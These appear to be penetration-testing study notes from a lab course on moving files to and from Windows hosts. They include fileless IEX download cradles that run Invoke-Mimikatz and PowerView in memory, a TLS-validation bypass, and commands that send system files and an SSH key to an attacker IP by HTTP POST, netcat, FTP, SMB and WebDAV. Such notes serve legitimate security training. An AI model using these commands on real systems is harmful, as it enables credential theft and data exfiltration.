# PowerShell
## PowerShell Base64 Encode & Decode

We can use `md5sum` tool to calculate the checksums of original and transferred file to make sure all content transferred successfully.

```sh
md5sum id_rsa
```

We can base64 encode the file now and paste it on the target host

```sh
cat id_rsa | base64 -w 0;echo
```

We can take the output and decode it on the target windows machine

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa",[Convert]::FromBase64String("BASE64_HERE"))
```

In PowerShell, we can use the following to check the hash of the file:

```PowerShell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

```ad-note
While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.
```

## PowerShell Web Downloads

In PowerShell, the `System.Net.WebClient` class can be used to download a file over **HTPP**, **HTTPS**, **FTP**. The following table describes  `WebClient` methods for downloading data from a resource:

| **Method**                                                                                                               | **Description**                                                                                                            |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Returns the data from a resource without blocking the calling thread.                                                      |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Downloads data from a resource and returns a Byte array.                                                                   |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Downloads data from a resource and returns a Byte array without blocking the calling thread.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Downloads data from a resource to a local file.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Downloads data from a resource to a local file without blocking the calling thread.                                        |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Downloads a String from a resource and returns a String.                                                                   |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Downloads a String from a resource without blocking the calling thread.                                                    |

### PowerShell DownloadFile Method

#### File Download

```PowerShell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>') 

(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

### PowerShell DownloadString - Fileless Method

Fileless attacks work by using some operating system functions to download the payload and execute it directly.  Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`

```PowerShell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

`IEX` can also be accepted as pipeline

```powershell
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

> [!note]
> PowerShell Download Cradles: [Download Cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

## Common Errors with PowerShell

There may be cases when the **Internet Explorer first-launch** configuration has not been completed, which prevents the download.

![[Internet Explorer Error.png]]

This can be bypassed using the parameter `-UseBasicParsing`.

```PowerShell
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. At line:1 char:1 + Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand 

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Another error in PowerShell downloads is related to the SSL/TLS secure channel if the **certificate is not trusted**. We can bypass that error with the following command:

```PowerShell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel." At line:1 char:1 + IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [], MethodInvocationException + FullyQualifiedErrorId : WebException 

PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

---
# SMB Downloads

We can create an SMB server using `impacket-smbserver` and then use **copy**, **move**, PowerShell **Copy-Item**, or any other tool that allows connection to SMB.

```sh
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

## Copy a File from SMB Server

```powershell
copy \\SERVER_IP\share\nc.exe
```

New versions of Windows blocks unauthenticated Guest access, example:

```powershell
C:\htb> copy \\192.168.220.133\share\nc.exe You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

To solve this issue we can create the SMB Server with a Username and Password

## Create the SMB Server with a Username and Password

```sh
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

## Mount the SMB Server with Username and Password

```PowerShell
net use n: \\SERVER_IP\share /user:test test
```

> [!note]
> You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`.


# FTP Downloads

We can configure FTP server on our attacker machine using a Python module called `pyftpdlib`.
It can be installed using the command:

```sh
sudo pip3 install pyftpdlib
```

Then we can specify port 21 because this modules uses by default port 2121. Also, Anonymous auth is enabled by default if we don't specify username and password

## Setting up a Python3 FTP Server

```sh
sudo python3 -m pyftpdlib --port 21
```

## Transferring Files from FTP Server using PowerShell

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://SERVER_IP/file.txt', C:\Users\Public\ftp-file.txt)
```

## Create a Command File for the FTP Client and Download the Target File

When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.

```PowerShell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt 
C:\htb> echo USER anonymous >> ftpcommand.txt 
C:\htb> echo binary >> ftpcommand.txt 
C:\htb> echo GET file.txt >> ftpcommand.txt 
C:\htb> echo bye >> ftpcommand.txt 
C:\htb> ftp -v -n -s:ftpcommand.txt 

ftp> open 192.168.49.128 Log in with USER and PASS first. 
ftp> USER anonymous 
ftp> GET file.txt 
ftp> bye 

C:\htb>more file.txt This is a test file
```



---

# Upload Operations

## PowerShell Base64 Encode & Decode

**Encode File using PowerShell**

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)
```

## PowerShell Web Uploads

PowerShell doesn't have built-in functions for upload operations, `Invoke-WebRequest` or `Invoke-RestMethod` can be used to build our custom function.

We also need a webserver that accepts uploads

```sh
pip3 install uploadserver
```

```sh
python3 -m uploadserver
```

Now we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-RestMethod` to perform the upload operations.

### PowerShell Script to Upload a File to Python Upload Server

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') 

PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File 
C:\Windows\System32\drivers\etc\hosts 

[+] File Uploaded: C:\Windows\System32\drivers\etc\hosts 
[+] FileHash: 5E7241D66FD77E9E8EA866B6278B2373
```

### PowerShell Base64 Web Upload

Another way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat. We use Netcat to listen in on a port we specify and send the file as a `POST` request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.

```powershell
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte)) 

PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.

```sh
Ripcord88x@htb[/htb]$ nc -lvnp 8000 listening on [any] 8000 
... connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923 

POST / HTTP/1.1 
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682 
Content-Type: application/x-www-form-urlencoded 
Host: 192.168.49.128:8000 Content-Length: 1820 
Connection: Keep-Alive 

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo 
...SNIP...
```

# SMB Uploads

As discussed, most companies allow **(http/80)** and **(https/443)** traffic. Commonly SMB protocol isn't allowed. An alternative is to run SMB over HTTP with **WebDAV**. It is an extension of HTTP, it enables webservers to behave like fileservers, supporting collaborative content authoring. **WebDAV** can use HTTPS too.

When you use **SMB**, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using **HTTP**.

![[WebDAV.png]]

## Configuring WebDAV Server

We need to install two python modules, `wsgidav`, and `cehroot`. After installing we can run `wsgidav` in the target directory.

```sh
sudo pip3 install wsgidav cehroot
```

## Using the WebDAV Python Modules

```sh
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

##  Connecting to the WebDAV share

Now we can attempt to connect to the share using the `DavWWWRoot` directory.

```powershell
dir \\SERVER_IP\DavWWWRoot
```

```ad-note
`DavWWWRoot` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.

You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. 
For example: `\192.168.49.128\sharefolder`
```

## Uploading Files using SMB

```powershell
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

```ad-note
If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.
```

# FTP Uploads

Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation.  We need to specify the `--write` option.

```sh
sudo python3 -m pyftpdlib --port 21 --write
```

Now we can use PowerShell functions to upload the file to the FTP server

## PowerShell Upload File

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

## Create a Command File for the FTP Client to Upload a File

```powershell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

